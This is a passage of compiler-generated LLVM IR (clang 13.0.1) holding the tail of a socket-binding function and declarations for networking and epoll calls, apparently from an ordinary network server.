  %51 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %50, i32 0, i32 5
  %52 = load %struct.sockaddr*, %struct.sockaddr** %51, align 8
  %53 = load %struct.addrinfo*, %struct.addrinfo** %6, align 8
  %54 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %53, i32 0, i32 4
  %55 = load i32, i32* %54, align 8
  %56 = call i32 @bind(i32 %49, %struct.sockaddr* %52, i32 %55) #9
  store i32 %56, i32* %7, align 4
  %57 = load i32, i32* %7, align 4
  %58 = icmp eq i32 %57, 0
  br i1 %58, label %59, label %60

59:                                               ; preds = %48
  br label %67

60:                                               ; preds = %48
  %61 = load i32, i32* %8, align 4
  %62 = call i32 @close(i32 %61)
  br label %63

63:                                               ; preds = %60, %41
  %64 = load %struct.addrinfo*, %struct.addrinfo** %6, align 8
  %65 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %64, i32 0, i32 7
  %66 = load %struct.addrinfo*, %struct.addrinfo** %65, align 8
  store %struct.addrinfo* %66, %struct.addrinfo** %6, align 8
  br label %25, !llvm.loop !21

67:                                               ; preds = %59, %25
  %68 = load %struct.addrinfo*, %struct.addrinfo** %6, align 8
  %69 = icmp eq %struct.addrinfo* %68, null
  br i1 %69, label %70, label %73

70:                                               ; preds = %67
  %71 = load %struct._IO_FILE*, %struct._IO_FILE** @stderr, align 8
  %72 = call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* %71, i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.71, i64 0, i64 0))
  store i32 -1, i32* %2, align 4
  br label %76

73:                                               ; preds = %67
  %74 = load %struct.addrinfo*, %struct.addrinfo** %5, align 8
  call void @freeaddrinfo(%struct.addrinfo* %74) #9
  %75 = load i32, i32* %8, align 4
  store i32 %75, i32* %2, align 4
  br label %76

76:                                               ; preds = %73, %70, %18
  %77 = load i32, i32* %2, align 4
  ret i32 %77
}

; Function Attrs: noreturn nounwind
declare void @abort() #6

; Function Attrs: nounwind
declare i32 @epoll_create1(i32) #3

; Function Attrs: nofree nosync nounwind willreturn
declare i8* @llvm.stacksave() #7

declare i32 @fcntl(i32, i32, ...) #1

declare i32 @getaddrinfo(i8*, i8*, %struct.addrinfo*, %struct.addrinfo**) #1

; Function Attrs: nounwind
declare i8* @gai_strerror(i32) #3

; Function Attrs: nounwind
declare i32 @setsockopt(i32, i32, i32, i8*, i32) #3

; Function Attrs: nounwind
declare void @freeaddrinfo(%struct.addrinfo*) #3

attributes #0 = { noinline nounwind optnone sspstrong uwtable "frame-pointer"="all" "min-legal-vector-width"="0" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #1 = { "frame-pointer"="all" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #2 = { nounwind readonly willreturn "frame-pointer"="all" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #3 = { nounwind "frame-pointer"="all" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #4 = { argmemonly nofree nounwind willreturn writeonly }
attributes #5 = { nounwind readnone willreturn "frame-pointer"="all" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #6 = { noreturn nounwind "frame-pointer"="all" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #7 = { nofree nosync nounwind willreturn }
attributes #8 = { nounwind readonly willreturn }
attributes #9 = { nounwind }
attributes #10 = { nounwind readnone willreturn }
attributes #11 = { noreturn nounwind }

!llvm.module.flags = !{!0, !1, !2, !3, !4}
!llvm.ident = !{!5}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{i32 7, !"PIC Level", i32 2}
!2 = !{i32 7, !"PIE Level", i32 2}
!3 = !{i32 7, !"uwtable", i32 1}
!4 = !{i32 7, !"frame-pointer", i32 2}
!5 = !{!"clang version 13.0.1"}
!6 = distinct !{!6, !7}
!7 = !{!"llvm.loop.mustprogress"}
!8 = distinct !{!8, !7}
!9 = distinct !{!9, !7}
!10 = distinct !{!10, !7}
!11 = distinct !{!11, !7}
!12 = distinct !{!12, !7}
!13 = distinct !{!13, !7}
!14 = distinct !{!14, !7}
!15 = distinct !{!15, !7}
!16 = distinct !{!16, !7}
!17 = distinct !{!17, !7}
!18 = distinct !{!18, !7}
!19 = distinct !{!19, !7}
!20 = distinct !{!20, !7}
!21 = distinct !{!21, !7}
